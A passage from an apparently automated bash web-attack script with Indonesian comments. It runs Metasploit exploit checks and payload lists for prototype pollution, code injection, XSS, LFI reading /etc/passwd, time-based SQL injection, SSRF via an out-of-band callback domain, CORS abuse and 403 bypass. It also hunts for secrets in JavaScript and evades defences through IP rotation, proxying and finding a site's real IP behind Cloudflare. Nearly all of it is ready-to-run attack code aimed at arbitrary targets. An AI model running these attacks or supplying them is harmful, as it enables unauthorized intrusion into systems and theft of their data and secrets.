                -rate-limit $(get_threads 100) -bulk-size $(get_threads 20) \
                -o "${OUTPUT_DIR}/vulns/nuclei_main.txt" -silent 2>/dev/null
            NUCLEI_CNT=$(wc -l < "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null || echo 0)
            notify OK "Nuclei -> ${NUCLEI_CNT} findings"
        fi
    }

    tool_done "${OUTPUT_DIR}/vulns/nuclei_subs.txt" 50 && \
        notify OK "Nuclei subs -- already exists, skipping" || {
        [[ -f "${OUTPUT_DIR}/recon/live_hosts.txt" ]] && check_tool "nuclei" && {
            px nuclei -l "${OUTPUT_DIR}/recon/live_hosts.txt" \
                -t cves/ -t misconfigurations/ \
                -severity medium,high,critical \
                -o "${OUTPUT_DIR}/vulns/nuclei_subs.txt" -silent 2>/dev/null
            notify OK "Nuclei subdomains -> vulns/nuclei_subs.txt"
        }
    }
fi

# ── PHASE 15: METASPLOIT ────────────────────────────────────────
update_turbo; show_time_status
should_skip 15 || separator "PHASE 15 -- METASPLOIT"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/metasploit/output.txt" 100 && \
        notify OK "Metasploit -- already exists, skipping" || {
        if check_tool "msfconsole"; then
            MSF_OUT="${OUTPUT_DIR}/metasploit/scan.rc"
            REAL_IP=""
            [[ "$CF_DETECTED" == "true" ]] && \
                REAL_IP=$(grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" \
                "${OUTPUT_DIR}/recon/cf_bypass.txt" 2>/dev/null | \
                grep -v "^104\.\|^172\.6[4-7]\.\|^162\.158\.\|^108\.162\.\|^190\.93\." | \
                head -1)
            {
                echo "setg RHOSTS ${DOMAIN}"
                echo "setg RHOST ${DOMAIN}"
                echo "setg THREADS 10"
                [[ -n "$REAL_IP" ]] && echo "setg RHOSTS ${REAL_IP}"
                echo "use auxiliary/scanner/http/http_header"; echo "run"
                echo "use auxiliary/scanner/http/http_version"; echo "run"
                echo "use auxiliary/scanner/http/robots_txt"; echo "run"
                echo "use auxiliary/scanner/http/backup_file"; echo "run"
                echo "use auxiliary/scanner/http/dir_scanner"; echo "set PATH /"; echo "run"
                echo "use auxiliary/scanner/http/lfi_scanner"; echo "run"
                echo "use auxiliary/scanner/http/xss_scanner"; echo "run"
                echo "use auxiliary/scanner/http/blind_sql_query"; echo "run"
                echo "use auxiliary/scanner/http/default_credentials"; echo "run"
                echo "use auxiliary/scanner/ssl/openssl_heartbleed"
                echo "set RPORT 443"; echo "run"
                echo "use auxiliary/scanner/ssl/ssl_version"; echo "run"
                echo "use exploit/multi/http/php_cgi_arg_injection"; echo "check"
                echo "use exploit/multi/http/spring4shell"; echo "check"
                echo "use exploit/multi/http/log4shell_header_injection"
                echo "set SRVHOST 127.0.0.1"; echo "check"
                echo "use auxiliary/scanner/http/wordpress_scanner"; echo "run"
                [[ -n "$REAL_IP" ]] && {
                    echo "use auxiliary/scanner/portscan/tcp"
                    echo "set RHOSTS ${REAL_IP}"
                    echo "set PORTS 21,22,23,25,53,80,443,3306,5432,6379,8080,8443,27017"
                    echo "run"
                }
                echo "exit"
            } > "$MSF_OUT"
            notify INFO "Running Metasploit..."
            rotate_ip
            px msfconsole -q -r "$MSF_OUT" \
                > "${OUTPUT_DIR}/metasploit/output.txt" 2>/dev/null
            notify OK "Metasploit -> metasploit/output.txt"
        fi
    }
fi

# ── BAGIAN 3: ADDON ─────────────────────────────────────────────
separator "SECTION 3 -- ADVANCED PENTEST ADDON"
notify PHASE "Prototype Pollution + Code Injection + Browser XSS"

# ADDON A: PROTOTYPE POLLUTION
update_turbo; show_time_status
should_skip 16 || separator "ADDON A -- PROTOTYPE POLLUTION"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/prototype_pollution/query.txt" 10 && \
        notify OK "PP -- already exists, skipping" || {
        PP_PAYLOADS=(
            "__proto__[polluted]=true" "__proto__[isAdmin]=true"
            "__proto__[role]=admin" "constructor[prototype][polluted]=true"
        )
        PP_JSON_LIST=(
            '__proto__[polluted]=true' '__proto__[isAdmin]=true'
            'constructor[prototype][polluted]=true'
        )
        API_EPS=("/" "/api" "/api/v1" "/login" "/user" "/settings")
        {
            echo "=== PP QUERY PARAM === $(date)"
            for payload in "${PP_PAYLOADS[@]}"; do
                RESP=$(rq --max-time 8 "${TARGET_URL}?${payload}" \
                       -w "\nHTTP_CODE:%{http_code}" 2>/dev/null)
                CODE=$(echo "$RESP" | grep "HTTP_CODE:" | cut -d: -f2)
                BODY=$(echo "$RESP" | grep -v "HTTP_CODE:")
                echo "$BODY" | grep -qiE "polluted|isAdmin|admin" && \
                    echo "[!!!] PP POTENTIAL: ?${payload} -> $CODE"
            done
        } > "${OUTPUT_DIR}/prototype_pollution/query.txt"
        {
            echo "=== PP JSON POST === $(date)"
            for ep in "${API_EPS[@]}"; do
                for payload in "${PP_JSON_LIST[@]}"; do
                    RESP=$(rq -X POST \
                           -H "Content-Type: application/x-www-form-urlencoded" \
                           -d "${payload}" --max-time 8 \
                           "${TARGET_URL}${ep}" 2>/dev/null)
                    echo "$RESP" | grep -qiE "polluted|isAdmin|admin" && \
                        echo "[!!!] PP CONFIRMED: ${TARGET_URL}${ep}"
                done
            done
        } > "${OUTPUT_DIR}/prototype_pollution/json_post.txt"
        check_tool "nuclei" && \
            px nuclei -u "$TARGET_URL" -tags "prototype-pollution" -silent \
            -o "${OUTPUT_DIR}/prototype_pollution/nuclei_pp.txt" 2>/dev/null
        PP_CNT=$(grep -c "POTENTIAL\|CONFIRMED" \
            "${OUTPUT_DIR}/prototype_pollution/query.txt" 2>/dev/null || echo 0)
        notify OK "Prototype Pollution -> ${PP_CNT} findings"
    }
fi

# ADDON B: CODE INJECTION
update_turbo; show_time_status
should_skip 17 || separator "ADDON B -- CODE INJECTION PHP Python JS"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/code_injection/php.txt" 5 && \
        notify OK "Code Injection -- already exists, skipping" || {
        PHP_PAYLOADS=("phpinfo()" "system(id)" "echo md5(phpinjected)" "passthru(id)")
        PY_PAYLOADS=("{{7*7}}" "{{config}}")
        JS_PAYLOADS=("process.version" "JSON.stringify(process.env)")
        CODE_PARAMS=(input data code eval cmd q query content template src)
        for lang in php python nodejs; do
            case $lang in
                php)     PAYLOADS=("${PHP_PAYLOADS[@]}"); GREP="uid=|root:|PHP Version" ;;
                python)  PAYLOADS=("${PY_PAYLOADS[@]}");  GREP="uid=0|root:|<class " ;;
                nodejs)  PAYLOADS=("${JS_PAYLOADS[@]}");  GREP="uid=|root:|node_modules" ;;
            esac
            {
                echo "=== ${lang^^} INJECTION === $(date)"
                for param in "${CODE_PARAMS[@]}"; do
                    for payload in "${PAYLOADS[@]}"; do
                        RESP=$(rq --max-time 8 -G \
                               --data-urlencode "${param}=${payload}" \
                               "$TARGET_URL" 2>/dev/null)
                        echo "$RESP" | grep -qiE "$GREP" && \
                            echo "[!!!] ${lang^^} INJECTION: param=${param}"
                    done
                done
            } > "${OUTPUT_DIR}/code_injection/${lang}.txt"
        done
        notify OK "Code Injection done"
    }
fi

# ADDON C: BROWSER XSS
update_turbo; show_time_status
should_skip 18 || separator "ADDON C -- REAL BROWSER XSS Headless Playwright"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/browser_xss/results.json" 10 && \
        notify OK "Browser XSS -- already exists, skipping" || {
        if command -v node &>/dev/null; then
            npm install playwright --silent 2>/dev/null
            npx playwright install chromium 2>/dev/null || true
            BXSS_SCRIPT="/tmp/bxss_cass.js"
            cat > "$BXSS_SCRIPT" << 'BXSSEOF'
const { chromium } = require('playwright');
const fs = require('fs');
const TARGET = process.argv[2];
const PARAMS_F = process.argv[3];
const OUT_F = process.argv[4];

const DEVICES = [
    {name:"Win-Chrome",ua:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36",vp:{width:1920,height:1080}},
    {name:"Mac-Safari",ua:"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) Version/17.3 Safari/605.1.15",vp:{width:1440,height:900}},
    {name:"Android",ua:"Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/122.0.0.0 Mobile Safari/537.36",vp:{width:412,height:915}},
    {name:"iPhone",ua:"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) Mobile Safari/604.1",vp:{width:390,height:844}},
    {name:"Linux-FF",ua:"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Firefox/123.0",vp:{width:1366,height:768}},
];
const PAYLOADS = [
    "<script>alert(1)<\/script>","<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)<\/script>","<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>","<input autofocus onfocus=alert(1)>",
];
let urls = [];
try {
    if (PARAMS_F && fs.existsSync(PARAMS_F)) {
        urls = fs.readFileSync(PARAMS_F,'utf8')
            .split('\n').filter(u=>u.trim()&&u.startsWith('http')).slice(0,100);
    }
} catch(e){}
if (!urls.length) urls = [TARGET];
const results = [];
(async()=>{
    for (var di=0;di<DEVICES.length;di++){
        var device=DEVICES[di];
        var browser=await chromium.launch({headless:true,args:['--no-sandbox']});
        var ctx=await browser.newContext({userAgent:device.ua,viewport:device.vp,ignoreHTTPSErrors:true});
        ctx.on('page',function(page){
            page.on('dialog',async function(d){
                console.log('[!!!] XSS! Device:'+device.name+' URL:'+page.url());
                results.push({type:'XSS',device:device.name,url:page.url()});
                await d.dismiss();
            });
        });
        var slice=urls.slice(0,Math.ceil(urls.length/DEVICES.length));
        for (var ui=0;ui<slice.length;ui++){
            var page=await ctx.newPage();
            try {
                for (var pi=0;pi<PAYLOADS.length;pi++){
                    var p=PAYLOADS[pi];
                    try{
                        var tu=slice[ui].includes('=')?slice[ui].replace(/=[^&]*/g,'='+encodeURIComponent(p)):slice[ui]+'?xss='+encodeURIComponent(p);
                        await page.goto(tu,{timeout:8000,waitUntil:'domcontentloaded'});
                    }catch(e){}
                }
            }catch(e){}
            await page.close();
        }
        await browser.close();
        console.log('[v] Device '+device.name+' done');
    }
    var out={target:TARGET,devices:DEVICES.length,confirmed:results.filter(r=>r.type==='XSS').length,findings:results,timestamp:new Date().toISOString()};
    if(OUT_F) fs.writeFileSync(OUT_F,JSON.stringify(out,null,2));
    console.log('[SUMMARY] XSS Confirmed: '+out.confirmed);
})();
BXSSEOF
            notify INFO "Browser XSS -- 5 device profiles..."
            node "$BXSS_SCRIPT" \
                "$TARGET_URL" \
                "${OUTPUT_DIR}/params/urls_with_params.txt" \
                "${OUTPUT_DIR}/browser_xss/results.json" 2>/dev/null | \
                tee "${OUTPUT_DIR}/browser_xss/log.txt"
            BXSS_CNT=$(python3 -c \
                "import json;d=json.load(open('${OUTPUT_DIR}/browser_xss/results.json'));print(d.get('confirmed',0))" \
                2>/dev/null || echo 0)
            notify OK "Browser XSS -> ${BXSS_CNT} confirmed"
        fi
    }
fi

# ADDON D: JS ANALYSIS
update_turbo; show_time_status
should_skip 19 || separator "ADDON D -- JAVASCRIPT SECRET HUNTING"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/js_analysis/secrets.txt" 10 && \
        notify OK "JS Analysis -- already exists, skipping" || {
        JS_FILES_DIR="${OUTPUT_DIR}/js_analysis/files"
        mkdir -p "$JS_FILES_DIR"
        cat "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null | \
            grep -E "\.js$" | head -$(get_max ${JS_MAX_FILES:-80}) | \
            while read -r jsurl; do
                FN=$(echo "$jsurl" | md5sum | cut -c1-8).js
                [[ ! -f "${JS_FILES_DIR}/${FN}" ]] && \
                    rq --max-time 10 "$jsurl" -o "${JS_FILES_DIR}/${FN}" 2>/dev/null
            done
        {
            echo "=== JS ANALYSIS === $(date)"
            for PAT_NAME in API_KEY AWS_KEY PASSWORD JWT_SECRET DB_CONN PP_SINK EVAL_SINK DOM_XSS; do
                case "$PAT_NAME" in
                    API_KEY)     PAT="api[_-]?key.*[:=].*[a-zA-Z0-9]{16,}" ;;
                    AWS_KEY)     PAT="AKIA[0-9A-Z]{16}" ;;
                    PASSWORD)    PAT="password.*[:=].*[a-zA-Z0-9]{6,}" ;;
                    JWT_SECRET)  PAT="jwt[_-]?secret|JWT_SECRET" ;;
                    DB_CONN)     PAT="mongodb://|mysql://|postgres://|redis://" ;;
                    PP_SINK)     PAT="Object\.assign|_.merge|deepmerge|__proto__" ;;
                    EVAL_SINK)   PAT="eval\(|new Function\(" ;;
                    DOM_XSS)     PAT="innerHTML|document\.write\(|outerHTML" ;;
                esac
                M=$(grep -rn -Ei "$PAT" "$JS_FILES_DIR" 2>/dev/null | head -3)
                [[ -n "$M" ]] && echo "[!] ${PAT_NAME}:" && echo "$M" && echo ""
            done
        } > "${OUTPUT_DIR}/js_analysis/secrets.txt"
        JS_SECRETS=$(grep -c "\[!\]" "${OUTPUT_DIR}/js_analysis/secrets.txt" 2>/dev/null || echo 0)
        notify OK "JS Analysis -> ${JS_SECRETS} secrets/sinks"
    }
fi

#  UPGRADE P1 -- ANTI FALSE POSITIVE VERIFICATION
# ================================================================
update_turbo; show_time_status
should_skip 20 || separator "UPGRADE P1 -- ANTI FALSE POSITIVE VERIFICATION"
notify PHASE "Re-verifying all findings..."

# Setup interactsh untuk SSRF/RCE blind confirm
OAST_DOMAIN=""
OAST_FILE="/tmp/cassiopeia_oast.txt"

if command -v interactsh-client &>/dev/null; then
    notify INFO "Setup interactsh OAST callback..."
    interactsh-client -server oast.pro \
        -o "$OAST_FILE" > /tmp/interactsh.log 2>&1 &
    INTERACTSH_PID=$!
    sleep 5
    OAST_DOMAIN=$(grep -oE '[a-z0-9]+\.oast\.pro' /tmp/interactsh.log | head -1)
    [[ -n "$OAST_DOMAIN" ]] && notify OK "OAST ready: ${OAST_DOMAIN}" || \
        notify WARN "OAST tidak aktif -- skip blind confirm"
fi

# ── P1.1: VERIFY XSS FINDINGS ────────────────────────────────
notify INFO "P1.1 Verifying XSS findings from Dalfox..."
{
    echo "=== XSS VERIFICATION === $(date)"
    CONFIRMED=0
    TOTAL=0

    # Re-test setiap POC dari dalfox dengan headless browser
    if [[ -f "${OUTPUT_DIR}/xss/dalfox.txt" ]] && command -v node &>/dev/null; then
        grep "POC" "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null | \
        while IFS= read -r line; do
            URL=$(echo "$line" | grep -oE 'https?://[^ ]+')
            [[ -z "$URL" ]] && continue
            TOTAL=$((TOTAL+1))

            # Test via headless browser
            RESULT=$(node -e "
const {chromium} = require('playwright');
(async()=>{
    const b = await chromium.launch({headless:true,args:['--no-sandbox']});
    const p = await b.newPage();
    let fired = false;
    p.on('dialog', async d => { fired=true; await d.dismiss(); });
    try { await p.goto('${URL}',{timeout:8000}); } catch(e){}
    await b.close();
    console.log(fired ? 'CONFIRMED' : 'FALSE_POSITIVE');
})();
" 2>/dev/null)

            if [[ "$RESULT" == "CONFIRMED" ]]; then
                CONFIRMED=$((CONFIRMED+1))
                echo "[VERIFIED] XSS CONFIRMED: $URL"
            else
                echo "[FALSE_POS] XSS not confirmed: $URL"
            fi
        done
    fi
    echo ""
    echo "XSS Verify: ${CONFIRMED} confirmed dari ${TOTAL} findings"
} | tee "${OUTPUT_DIR}/xss/xss_verified.txt"

# ── P1.2: VERIFY SSRF FINDINGS ───────────────────────────────
notify INFO "P1.2 Verifying SSRF findings..."
{
    echo "=== SSRF VERIFICATION === $(date)"
    grep "POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_results.txt" 2>/dev/null | \
    while IFS= read -r line; do
        URL=$(echo "$line" | grep -oE 'https?://[^ ]+' | head -1)
        PARAM=$(echo "$line" | grep -oP '\?\K[^=]+')
        [[ -z "$URL" ]] && continue

        # Test dengan OAST callback jika tersedia
        if [[ -n "$OAST_DOMAIN" ]]; then
            TEST_URL="${URL}?${PARAM}=http://${OAST_DOMAIN}/ssrf-test"
            px curl -sk --max-time 10 "$TEST_URL" > /dev/null 2>&1
            sleep 3
            # Checking apakah OAST menerima callback
            if grep -q "ssrf-test" "$OAST_FILE" 2>/dev/null; then
                echo "[VERIFIED] SSRF CONFIRMED via OAST: $TEST_URL"
                continue
            fi
        fi

        # Fallback: cek response panjang/content berbeda
        RESP1=$(px curl -sk --max-time 5 "$URL" 2>/dev/null | wc -c)
        RESP2=$(px curl -sk --max-time 5 "${URL}?${PARAM}=http://127.0.0.1" \
                2>/dev/null | wc -c)
        DIFF=$((RESP2 - RESP1))
        [[ $DIFF -gt 100 || $DIFF -lt -100 ]] && \
            echo "[POTENTIAL] SSRF response diff ${DIFF} bytes: $URL" || \
            echo "[FALSE_POS] SSRF tidak terkonfirmasi: $URL"
    done
} | tee "${OUTPUT_DIR}/ssrf/ssrf_verified.txt"
notify OK "SSRF verify -> ssrf/ssrf_verified.txt"

# ── P1.3: VERIFY LFI FINDINGS ────────────────────────────────
notify INFO "P1.3 Double-checking LFI findings..."
{
    echo "=== LFI VERIFICATION === $(date)"
    grep "CONFIRMED" "${OUTPUT_DIR}/lfi/lfi_results.txt" 2>/dev/null | \
    while IFS= read -r line; do
        PARAM=$(echo "$line" | grep -oP '\?\K[^=]+')
        [[ -z "$PARAM" ]] && continue

        # Re-verify dengan payload berbeda
        RESP=$(px rq --max-time 5 \
               "${TARGET_URL}?${PARAM}=../../../../etc/passwd" 2>/dev/null)
        if echo "$RESP" | grep -qE "root:x:|daemon:x:"; then
            echo "[VERIFIED] LFI CONFIRMED: param=${PARAM}"
            echo "  Evidence: $(echo "$RESP" | grep "root:x:" | head -1)"
        else
            echo "[UNVERIFIED] LFI tidak bisa dikonfirmasi ulang: param=${PARAM}"
        fi
    done
} | tee "${OUTPUT_DIR}/lfi/lfi_verified.txt"
notify OK "LFI verify -> lfi/lfi_verified.txt"

# ── P1.4: VERIFY NUCLEI FINDINGS (filter evidence) ───────────
notify INFO "P1.4 Filtering Nuclei findings -- evidence-based only..."
{
    echo "=== NUCLEI VERIFIED FINDINGS === $(date)"
    echo ""

    # Critical & High saja yang di-verify
    grep -iE "\[critical\]|\[high\]" \
        "${OUTPUT_DIR}/vulns/nuclei_main.txt" 2>/dev/null | \
    while IFS= read -r line; do
        URL=$(echo "$line" | grep -oE 'https?://[^ ]+' | head -1)
        TEMPLATE=$(echo "$line" | grep -oP '\[\K[^\]]+' | head -1)
        [[ -z "$URL" ]] && continue

        # Re-test URL masih accessible
        CODE=$(px curl -sk -o /dev/null -w "%{http_code}" \
               --max-time 8 "$URL" 2>/dev/null)

        if [[ "$CODE" =~ ^(200|301|302|401|403|500)$ ]]; then
            echo "[ACTIVE] ${line}"
        else
            echo "[INACTIVE] HTTP ${CODE} -- mungkin false positive: ${line}"
        fi
    done
    echo ""
    echo "Note: INACTIVE bisa false positive -- verifikasi manual"
} | tee "${OUTPUT_DIR}/vulns/nuclei_verified.txt"
notify OK "Nuclei verify -> vulns/nuclei_verified.txt"

# ── P1.5: VERIFY CORS ────────────────────────────────────────
notify INFO "P1.5 Verifying CORS findings..."
{
    echo "=== CORS VERIFICATION === $(date)"
    grep "CONFIRMED\|MISCONFIG" \
        "${OUTPUT_DIR}/cors/cors_results.txt" 2>/dev/null | \
    while IFS= read -r line; do
        # Re-test dengan origin evil.com + cek credentials
        RESP=$(px curl -sk -I \
               -H "Origin: https://evil.com" \
               "$TARGET_URL" 2>/dev/null)
        ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin")
        ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials")

        if echo "$ACAO" | grep -qi "evil.com"; then
            if echo "$ACAC" | grep -qi "true"; then
                echo "[CRITICAL] CORS + Credentials: attacker can steal data!"
                echo "  ACAO: $ACAO"
                echo "  ACAC: $ACAC"
            else
                echo "[HIGH] CORS misconfiguration (no credentials)"
                echo "  ACAO: $ACAO"
            fi
        else
            echo "[FALSE_POS] CORS tidak terkonfirmasi"
        fi
    done
} | tee "${OUTPUT_DIR}/cors/cors_verified.txt"
notify OK "CORS verify -> cors/cors_verified.txt"

# ── P1.6: VERIFY SQL INJECTION ───────────────────────────────
notify INFO "P1.6 Verifying SQLi -- time-based blind confirm..."
{
    echo "=== SQLI TIME-BASED VERIFICATION === $(date)"
    # Cari endpoint yang pernah injectable dari SQLMap
    find "${OUTPUT_DIR}/sqli" -name "*.csv" 2>/dev/null | \
    while read -r csvfile; do
        URL=$(grep -oE 'https?://[^,]+' "$csvfile" | head -1)
        [[ -z "$URL" ]] && continue

        # Time-based confirm: kalau delay 5 detik = injectable
        START=$(date +%s%N)
        px curl -sk --max-time 15 \
            "${URL}'" \
            -G --data-urlencode "q=1' AND SLEEP(5)--" \
            > /dev/null 2>&1
        END=$(date +%s%N)
        ELAPSED=$(( (END - START) / 1000000 ))

        if [[ $ELAPSED -gt 4500 ]]; then
            echo "[VERIFIED] SQLi TIME-BASED CONFIRMED: $URL (${ELAPSED}ms delay)"
        else
            echo "[CHECK] SQLi response time ${ELAPSED}ms: $URL"
        fi
    done
} | tee "${OUTPUT_DIR}/sqli/sqli_verified.txt"
notify OK "SQLi verify -> sqli/sqli_verified.txt"

# Kill interactsh
[[ -n "$INTERACTSH_PID" ]] && kill "$INTERACTSH_PID" 2>/dev/null


# ================================================================
#  UPGRADE P2 -- COVERAGE ENHANCEMENTS
# ================================================================
update_turbo; show_time_status
should_skip 21 || separator "UPGRADE P2 -- COVERAGE ENHANCEMENTS"
notify PHASE "Screenshot + Subdomain Takeover + 403 Bypass + API Discovery..."

# ── P2.1: SCREENSHOT SEMUA LIVE HOSTS ────────────────────────
separator "P2.1 -- SCREENSHOT LIVE HOSTS"
notify INFO "Screenshot semua live host via gowitness..."
mkdir -p "${OUTPUT_DIR}/screenshots"

if command -v gowitness &>/dev/null; then
    gowitness file -f "${OUTPUT_DIR}/recon/live_hosts.txt" \
        --screenshot-path "${OUTPUT_DIR}/screenshots" \
        --timeout 10 --threads 10 2>/dev/null
    SHOT_COUNT=$(ls "${OUTPUT_DIR}/screenshots/"*.png 2>/dev/null | wc -l)
    notify OK "Screenshots done -- ${SHOT_COUNT} images -> screenshots/"
elif command -v aquatone &>/dev/null; then
    cat "${OUTPUT_DIR}/recon/live_hosts.txt" | \
        aquatone -out "${OUTPUT_DIR}/screenshots" \
        -timeout 10000 -threads 10 2>/dev/null
    notify OK "Aquatone screenshots -> screenshots/"
else
    # Fallback: curl + convert (basic)
    notify WARN "gowitness/aquatone not found -- install: yay -S gowitness"
    # Screenshot pake cutycapt kalau ada
    if command -v cutycapt &>/dev/null; then
        head -20 "${OUTPUT_DIR}/recon/live_hosts.txt" | \
        while read -r host; do
            URL=$(echo "$host" | awk '{print $1}')
            FNAME=$(echo "$URL" | sed 's|https\?://||;s|/|_|g')
            cutycapt --url="$URL" \
                --out="${OUTPUT_DIR}/screenshots/${FNAME}.png" \
                --delay=2000 2>/dev/null
        done
        notify OK "Screenshots via cutycapt -> screenshots/"
    fi
fi

# ── P2.2: SUBDOMAIN TAKEOVER ─────────────────────────────────
separator "P2.2 -- SUBDOMAIN TAKEOVER CHECK"
notify INFO "Checking subdomain takeover via subjack/subzy..."

if command -v subjack &>/dev/null; then
    subjack -w "${OUTPUT_DIR}/recon/all_subs.txt" \
        -t 50 -timeout 30 -ssl \
        -o "${OUTPUT_DIR}/recon/takeover_subjack.txt" 2>/dev/null
    TAKE_CNT=$(grep -c "Vulnerable" \
        "${OUTPUT_DIR}/recon/takeover_subjack.txt" 2>/dev/null || echo 0)
    notify OK "Subjack -- ${TAKE_CNT} vulnerable -> recon/takeover_subjack.txt"
elif command -v subzy &>/dev/null; then
    subzy run --targets "${OUTPUT_DIR}/recon/all_subs.txt" \
        --concurrency 50 --timeout 10 \
        > "${OUTPUT_DIR}/recon/takeover_subzy.txt" 2>/dev/null
    TAKE_CNT=$(grep -c "VULNERABLE" \
        "${OUTPUT_DIR}/recon/takeover_subzy.txt" 2>/dev/null || echo 0)
    notify OK "Subzy -- ${TAKE_CNT} vulnerable -> recon/takeover_subzy.txt"
else
    notify WARN "subjack/subzy not found"
    notify INFO "Manual subdomain takeover check via CNAME analysis..."
    {
        echo "=== SUBDOMAIN TAKEOVER MANUAL CHECK === $(date)"
        cat "${OUTPUT_DIR}/recon/all_subs.txt" 2>/dev/null | \
        while read -r sub; do
            CNAME=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
            [[ -z "$CNAME" ]] && continue

            # Checking apakah CNAME target masih ada
            for service in "github.io" "amazonaws.com" "heroku" \
                           "shopify" "fastly" "azure" "surge.sh" \
                           "bitbucket.io" "wordpress.com" "ghost.io"; do
                if echo "$CNAME" | grep -qi "$service"; then
                    HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
                                "http://${sub}" --max-time 5 2>/dev/null)
                    [[ "$HTTP_CODE" == "404" || -z "$HTTP_CODE" ]] && \
                        echo "[!] POTENTIAL TAKEOVER: ${sub} -> ${CNAME} (HTTP: ${HTTP_CODE})"
                fi
            done
        done
    } | tee "${OUTPUT_DIR}/recon/takeover_manual.txt"
    notify OK "Takeover manual check -> recon/takeover_manual.txt"
fi

# ── P2.3: 403 BYPASS ─────────────────────────────────────────
separator "P2.3 -- 403 BYPASS TESTING"
notify INFO "Testing 403 bypass via header manipulation..."

# Collecting all 403 URLs
FORBIDDEN_URLS=()
for dir_file in "${OUTPUT_DIR}/dirs/"*.txt "${OUTPUT_DIR}/dirs/"*.json; do
    [[ -f "$dir_file" ]] || continue
    while IFS= read -r url; do
        [[ "$url" =~ "403" ]] && FORBIDDEN_URLS+=("$url")
    done < <(grep "403" "$dir_file" 2>/dev/null | \
             grep -oE 'https?://[^ ]+' | head -20)
done

# Tambah common 403 paths
for path in /admin /admin/ /dashboard /config /server-status \
            /phpinfo.php /.env /backup /api/admin; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
           --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
    [[ "$CODE" == "403" ]] && FORBIDDEN_URLS+=("${TARGET_URL}${path}")
done

{
    echo "=== 403 BYPASS TEST === $(date)"
    echo "Testing ${#FORBIDDEN_URLS[@]} forbidden URLs"
    echo ""

    BYPASS_HEADERS=(
        "X-Original-URL: REPLACE"
        "X-Rewrite-URL: REPLACE"
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Host: localhost"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-originating-IP: 127.0.0.1"
        "Referer: REPLACE"
        "X-Arbitrary: localhost"
    )

    for url in "${FORBIDDEN_URLS[@]:0:30}"; do
        PATH_ONLY=$(echo "$url" | sed 's|https\?://[^/]*||')
        [[ -z "$PATH_ONLY" ]] && PATH_ONLY="/"

        # Test path manipulation
        for test_path in \
            "${PATH_ONLY}/" \
            "${PATH_ONLY}/." \
            "${PATH_ONLY}%20" \
            "${PATH_ONLY}%09" \
            "${PATH_ONLY}..;/" \
            "/${PATH_ONLY#/}"; do
            CODE=$(px curl -sk -o /dev/null -w "%{http_code}" \
                   --max-time 5 \
                   "${TARGET_URL}${test_path}" 2>/dev/null)
            [[ "$CODE" == "200" ]] && \
                echo "[BYPASS] Path manipulation: ${TARGET_URL}${test_path} -> 200"
        done

        # Test header bypass
        for header in "${BYPASS_HEADERS[@]}"; do
            H=$(echo "$header" | sed "s|REPLACE|${url}|g")
            CODE=$(px curl -sk -o /dev/null -w "%{http_code}" \
                   --max-time 5 -H "$H" \
                   "$url" 2>/dev/null)
            [[ "$CODE" == "200" ]] && \
                echo "[BYPASS] Header bypass: $H -> 200 on $url"
        done
    done
} | tee "${OUTPUT_DIR}/auth/bypass_403.txt"
BYPASS_CNT=$(grep -c "\[BYPASS\]" \
    "${OUTPUT_DIR}/auth/bypass_403.txt" 2>/dev/null || echo 0)
notify OK "403 Bypass -- ${BYPASS_CNT} bypasses found -> auth/bypass_403.txt"

# ── P2.4: API DISCOVERY ──────────────────────────────────────
separator "P2.4 -- API DISCOVERY"
notify INFO "Searching for swagger/openapi/graphql endpoints..."
mkdir -p "${OUTPUT_DIR}/api"

{
    echo "=== API DISCOVERY === $(date)"

    # Common API doc endpoints
    API_ENDPOINTS=(
        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
        "/api-docs" "/api-docs.json" "/api/swagger.json"
        "/openapi.json" "/openapi.yaml" "/api/openapi.json"
        "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
        "/graphql" "/graphiql" "/api/graphql" "/playground"
        "/api/v1" "/api/v2" "/api/v3" "/api/v4"
        "/rest/api" "/rest/v1" "/rest/v2"
        "/_api" "/api" "/apis"
        "/wp-json" "/wp-json/wp/v2"
        "/.well-known/openid-configuration"
    )

    for ep in "${API_ENDPOINTS[@]}"; do
        RESP=$(px curl -sk --max-time 8 \
               -w "\nHTTP_CODE:%{http_code}" \
               "${TARGET_URL}${ep}" 2>/dev/null)
        CODE=$(echo "$RESP" | grep "HTTP_CODE:" | cut -d: -f2)
        BODY=$(echo "$RESP" | grep -v "HTTP_CODE:")

        if [[ "$CODE" =~ ^(200|201)$ ]]; then
            echo "[FOUND] ${TARGET_URL}${ep} (HTTP $CODE)"

            # Parse swagger endpoints
            if echo "$BODY" | grep -qi "swagger\|openapi"; then
                echo "  [API DOC] Swagger/OpenAPI detected!"
                # Extract endpoints dari swagger
                ENDPOINTS=$(echo "$BODY" | \
                    python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    paths=d.get('paths',{})
    for p in list(paths.keys())[:20]:
        methods=list(paths[p].keys())
